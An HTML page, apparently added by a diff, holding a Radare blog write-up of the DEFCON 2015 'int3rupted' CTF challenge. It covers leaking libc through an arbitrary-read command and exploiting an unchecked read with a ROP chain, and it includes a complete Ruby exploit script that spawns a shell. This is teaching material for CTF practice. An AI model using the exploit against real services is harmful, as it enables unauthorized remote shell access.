@@ -1,1 +1,375 @@
-<!DOCTYPE html><html><head><title>https://radare.today/posts/solving-int3rupted-from-defcon-2015-qualifier-with-r2/</title><link rel="canonical" href="https://radare.today/posts/solving-int3rupted-from-defcon-2015-qualifier-with-r2/"/><meta name="robots" content="noindex"><meta charset="utf-8" /><meta http-equiv="refresh" content="0; url=https://radare.today/posts/solving-int3rupted-from-defcon-2015-qualifier-with-r2/" /></head></html>
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>The Official Radare Blog  | Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="generator" content="Hugo 0.58.3" />
+    
+    
+      <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+    
+
+    
+    
+      <link href="/dist/css/app.d98f2eb6bcd1eaedb7edf166bd16af26.css" rel="stylesheet">
+    
+
+    
+
+    
+      
+    
+
+    
+
+    <meta property="og:title" content="Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2" />
+<meta property="og:description" content="In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the DEFCON 2015 qualifiers!
+You can find the binary here if you want to play along at home.
+To start with, in the challenge, we were just given a hostname and ip address, no binary was given!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://radare.today/posts/solving-int3rupted-from-defcon-2015-qualifier-with-r2/" />
+<meta property="article:published_time" content="2015-06-04T21:43:59+02:00" />
+<meta property="article:modified_time" content="2015-06-04T21:43:59+02:00" />
+<meta itemprop="name" content="Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2">
+<meta itemprop="description" content="In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the DEFCON 2015 qualifiers!
+You can find the binary here if you want to play along at home.
+To start with, in the challenge, we were just given a hostname and ip address, no binary was given!">
+
+
+<meta itemprop="datePublished" content="2015-06-04T21:43:59&#43;02:00" />
+<meta itemprop="dateModified" content="2015-06-04T21:43:59&#43;02:00" />
+<meta itemprop="wordCount" content="965">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2"/>
+<meta name="twitter:description" content="In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the DEFCON 2015 qualifiers!
+You can find the binary here if you want to play along at home.
+To start with, in the challenge, we were just given a hostname and ip address, no binary was given!"/>
+
+  </head>
+
+  <body class="ma0 avenir bg-near-white">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="https://radare.today" class="f3 fw2 hover-white no-underline white-90 dib">
+      The Official Radare Blog
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      
+
+
+
+<a href="radareorg" target="_blank" class="link-transition twitter link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+  <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/></svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+
+
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+
+    <header class="mt4 w-100">
+      <p class="f6 b helvetica tracked">
+          
+        POSTS
+      </p>
+      <h1 class="f1 athelas mb1">Solving &#39;int3rupted&#39; from defcon 2015 qualifier with r2</h1>
+      
+      <time class="f6 mv4 dib tracked" datetime="2015-06-04T21:43:59&#43;02:00">June 4, 2015</time>
+      
+      
+    </header>
+
+    <section class="nested-copy-line-height lh-copy serif f4 nested-links nested-img mid-gray pr4-l w-two-thirds-l"><p>In previous blog posts we&rsquo;ve shown how radare2 can be useful for exploiting &ldquo;baby&rdquo; level challenges. Let&rsquo;s show how we can use it to find the bug and ultimately exploit a 5 point pwning challenge from the <a href="https://legitbs.net/">DEFCON 2015 qualifiers</a>!</p>
+
+<p>You can find the binary <a href="https://github.com/ctfs/write-ups-2015/blob/master/defcon-qualifier-ctf-2015/pwnable/int3rupted/int3rupted_3bb8f10793b82841c44a366eb9f27223">here</a> if you want to play along at home.</p>
+
+<p>To start with, in the challenge, we were just given a hostname and ip address, no binary was given! To simulate this, we can use <code>rarun2</code> to host the binary locally. The following line will run the binary on port 8888 on connections:</p>
+
+<pre><code>rarun2 program=./int3rupted_3bb8f10793b82841c44a366eb9f27223 listen=8888
+</code></pre>
+
+<p>So, let&rsquo;s try connection with <code>nc</code> to try to interact. After some spamming every character, we discover that if you type in <code>?</code> a help message is displayed.</p>
+
+<pre><code>impactsite ~/int3 » nc localhost 8888
+&gt; ?
+Help menu:
+        g - Begin execution
+        db &lt;addr&gt; - Dump bytes at addr
+        bp addr - Set breakpoint at addr
+        c - Continue from breakpoint.
+        ? - This text
+&gt;
+</code></pre>
+
+<p>So, now the name <code>int3rupted</code> makes sense! The <code>int3</code> instruction is defined for use by debuggers to temporarily replace an instruction in a running program in order to set a breakpoint.</p>
+
+<p>Because this is the binary is not provided, it&rsquo;s going to take some work to find the bug! As we have arbitrary read with <code>db &lt;addr&gt;</code> it will just take a bit of work to find the bug.</p>
+
+<p>Checking through the loader script on Linux, amd64, we can see that the elf gets loaded at address <code>0x400000</code>, so you can start dumping from there.</p>
+
+<pre><code class="language-sh">impactsite ~ » cat /usr/lib/ldscripts/elf_x86_64.x | grep SEGMENT_START
+  PROVIDE (__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x400000)); . = SEGMENT_START(&quot;text-segment&quot;, 0x400000) + SIZEOF_HEADERS;
+  . = SEGMENT_START(&quot;ldata-segment&quot;, .);
+</code></pre>
+
+<p><img src="/images/elf_header.png" alt="header" /></p>
+
+<p>Although it is a tedious process, you can dump the enough of the binary to load it up in your favorite disassembler.</p>
+
+<p>So, quickly after reversing (which I will leave as an exercise to the reader), a high level overview of the binary is as follows.</p>
+
+<ul>
+<li><code>g</code> goes to chance game
+
+<ul>
+<li>high score lets you write your name into <em>.bss area</em></li>
+</ul></li>
+<li><code>db</code> dump bytes - we used to dump bin</li>
+<li><code>bp</code> sets breakpoint, write <code>0xCC</code> mark page as <code>R-X</code> (not <code>W</code>!) can’t do this to stack, b/c becomes unwritable :(</li>
+<li><code>c</code> restore from breakpoint</li>
+<li><code>?</code> print help text</li>
+</ul>
+
+<p>Let&rsquo;s look at how int3rupted reads in the user&rsquo;s input. The function takes in a length, a fd to read from, a buffer to write to, and a &ldquo;stop&rdquo; character (newline).</p>
+
+<p><img src="/images/disasm.png" alt="read_user_input" /></p>
+
+<p>Oh, what&rsquo;s this?!? The &ldquo;length&rdquo; var is increased, but it&rsquo;s termination value is at <code>length == 0</code>. This means we have an <em>unchecked</em> read.</p>
+
+<p>Let&rsquo;s have a look at who else calls the <code>read_user_input</code> function.</p>
+
+<p><img src="/images/pd2.png" alt="xrefs" /></p>
+
+<p>Can it really be so simple, just a basic stack smash from <code>main_menu</code>? There is no <code>system</code> called in the binary, and there is <em>ASLR</em> activated, but if you recall, we have an arbitrary read, so we can just leak the addresses of libc functions, simple! There isn&rsquo;t even a stack canary to worry about.</p>
+
+<p>Let&rsquo;s use <code>rabin2</code> to find the address to read in order to leak the libc function <code>puts</code>.</p>
+
+<p><img src="/images/rabin.png" alt="puts" /></p>
+
+<p>Let&rsquo;s just assume that it&rsquo;s on Ubuntu trusty, because all of the other challenges were. Otherwise there are some nice <a href="https://github.com/niklasb/libc-database">database tools</a> to use.</p>
+
+<p>So, from here, there is not much left to do. Just construct an exploit that does the following:</p>
+
+<ul>
+<li>leak libc address of puts</li>
+<li>compute offset of <code>/bin/sh\x00</code> and <code>system</code></li>
+<li><code>pop /bin/sh\x00</code> into <code>rdi</code></li>
+<li>call <code>system</code></li>
+</ul>
+
+<p>Simple, right?</p>
+
+<p>And like magic, we can get a shell! 5 easy points. The final exploit below has comments for the r2 commands to get the needed values (like rop gadgets and offsets).
+<img src="/images/shell.png" alt="shell" /></p>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+require_relative 'shoe'
+
+# host = &quot;int3rupted_3bb8f10793b82841c44a366eb9f27223.quals.shallweplayaga.me&quot;
+# port = 52428
+
+# rarun2 program=./int3rupted_3bb8f10793b82841c44a366eb9f27223 listen=8888
+host = &quot;localhost&quot;
+port = 8888
+
+# ubuntu trusty libc
+system_offset = 0x00046640 # is~name=system - from libc
+binsh_offset = 0x0017ccdb # / /bin/sh\x00 - from libc
+puts_offset = 0x0006fe30 # is~name=puts - from libc
+exit_offset = 0x0003c290 # is~name=exit - from libc
+# from int3rupted binary
+poprdirbpret = 0x00401648 # &quot;/R/ pop rdi;ret&quot;
+puts_got = 0x00603028 # iR~puts
+
+@s = Shoe.new host, port
+
+def read_menu
+  @s.read_til_end 0.1
+end
+
+@s.say &quot;?\n&quot;
+read_menu
+puts &quot;[!] dumping GOT address of puts&quot;
+@s.say &quot;db 0x#{puts_got.to_s 16}\n&quot;
+str = read_menu
+puts str.split(&quot;&gt;&quot;)[0]
+libc_base_addr = (str.split(&quot;-&quot;)[0].split(&quot;:&quot;)[1].reverse.split(&quot; &quot;).map{|i| i.reverse}.join(&quot;&quot;).to_i 16) - puts_offset
+puts &quot;[+] libc base is at 0x#{libc_base_addr.to_s 16}&quot;
+puts &quot;[+] system is at 0x#{(libc_base_addr + system_offset).to_s 16}&quot;
+puts &quot;[+] /bin/sh\\x00 is at 0x#{(libc_base_addr + binsh_offset).to_s 16}&quot;
+@s.say (&quot;g\n&quot;)
+read_menu
+rop = &quot;A&quot; * 56
+rop &lt;&lt; [poprdirbpret].pack(&quot;Q&quot;) # get /bin/sh into rdi
+rop &lt;&lt; [libc_base_addr + binsh_offset].pack(&quot;Q&quot;) # /bin/sh into rdi
+rop &lt;&lt; &quot;JUNKJUNK&quot; # garbage popped into rbp
+rop &lt;&lt; [libc_base_addr + system_offset].pack(&quot;Q&quot;) # system(&quot;/bin/sh&quot;)
+rop &lt;&lt; [libc_base_addr + exit_offset].pack(&quot;Q&quot;) # exit cleanly :)
+puts &quot;[!] sending rop chain!&quot;
+@s.say &quot;#{rop}\n&quot;
+str = read_menu
+puts &quot;[*] enjoy your shell&quot;
+@s.tie!
+</code></pre>
+
+<pre><code class="language-ruby">require 'socket'
+require 'timeout'
+require 'rolling_timeout'
+
+class Shoe &lt; TCPSocket
+  def recv_until str
+    buf = &quot;&quot;
+    until buf.end_with? str do
+      buf &lt;&lt; self.recv(1)
+    end
+    buf
+  end
+
+  def recv_until_re regex
+    buf = &quot;&quot;
+    while not regex.match buf
+      buf &lt;&lt; self.recv(1)
+    end
+    buf
+  end
+
+  def say str
+    self.send str, 0
+  end
+
+  def read_n_seconds secs
+    # requires native threads.
+    # doesn't work with ruby 1.8.x or lower
+    buf = &quot;&quot;
+    begin
+      timeout(secs) do
+        loop {
+          buf &lt;&lt; self.recv(1)
+        }
+      end
+    rescue Timeout::Error
+    end
+    buf
+  end
+
+  def read_til_end timeout
+    # timeout is time between chars
+    buf = &quot;&quot;
+    begin
+      RollingTimeout.new(timeout) { |timer|
+        loop {
+          buf &lt;&lt; self.recv(1)
+          timer.reset
+        }
+      }
+    rescue Timeout::Error
+    end
+    buf
+  end
+
+  def tie!
+    # kick off a thread just reading forever
+    Thread.new { loop { $stdout.write(self.recv(4096)) } }
+    str = &quot;&quot;
+    loop {
+      ch = $stdin.read_nonblock(1) rescue nil
+      if ch == nil
+        next
+      end
+      self.send ch, 0
+    }
+  end
+end
+</code></pre>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6">
+      
+      
+      </div>
+    </section>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://radare.today" >
+    &copy; 2019 The Official Radare Blog
+  </a>
+    <div>
+
+
+
+<a href="radareorg" target="_blank" class="link-transition twitter link dib z-999 pt3 pt0-l mr1" title="Twitter link" rel="noopener" aria-label="follow on Twitter——Opens in a new window">
+  <svg height="32px"  style="enable-background:new 0 0 67 67;" version="1.1" viewBox="0 0 67 67" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167,22.283c-2.619,0.953-4.274,3.411-4.086,6.101  l0.063,1.038l-1.048-0.127c-3.813-0.487-7.145-2.139-9.974-4.915l-1.383-1.377l-0.356,1.017c-0.754,2.267-0.272,4.661,1.299,6.271  c0.838,0.89,0.649,1.017-0.796,0.487c-0.503-0.169-0.943-0.296-0.985-0.233c-0.146,0.149,0.356,2.076,0.754,2.839  c0.545,1.06,1.655,2.097,2.871,2.712l1.027,0.487l-1.215,0.021c-1.173,0-1.215,0.021-1.089,0.467  c0.419,1.377,2.074,2.839,3.918,3.475l1.299,0.444l-1.131,0.678c-1.676,0.976-3.646,1.526-5.616,1.568  C19.775,43.256,19,43.341,19,43.405c0,0.211,2.557,1.397,4.044,1.864c4.463,1.377,9.765,0.783,13.746-1.568  c2.829-1.673,5.657-5,6.978-8.221c0.713-1.716,1.425-4.851,1.425-6.354c0-0.975,0.063-1.102,1.236-2.267  c0.692-0.678,1.341-1.419,1.467-1.631c0.21-0.403,0.188-0.403-0.88-0.043c-1.781,0.636-2.033,0.551-1.152-0.402  c0.649-0.678,1.425-1.907,1.425-2.267c0-0.063-0.314,0.042-0.671,0.233c-0.377,0.212-1.215,0.53-1.844,0.72l-1.131,0.361l-1.027-0.7  c-0.566-0.381-1.361-0.805-1.781-0.932C39.766,21.902,38.131,21.944,37.167,22.283z M33,64C16.432,64,3,50.569,3,34S16.432,4,33,4  s30,13.431,30,30S49.568,64,33,64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/></svg>
+
+<span class="new-window"><svg  height="8px"  style="enable-background:new 0 0 1000 1000;" version="1.1" viewBox="0 0 1000 1000" width="8px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" >
+<path d="M598 128h298v298h-86v-152l-418 418-60-60 418-418h-152v-86zM810 810v-298h86v298c0 46-40 86-86 86h-596c-48 0-86-40-86-86v-596c0-46 38-86 86-86h298v86h-298v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:;"/>
+</svg>
+</span></a>
+
+
+
+
+
+
+
+
+</div>
+  </div>
+</footer>
+
+    
+
+  <script src="/dist/js/app.3fc0f988d21662902933.js"></script>
+
+
+  </body>
+</html>
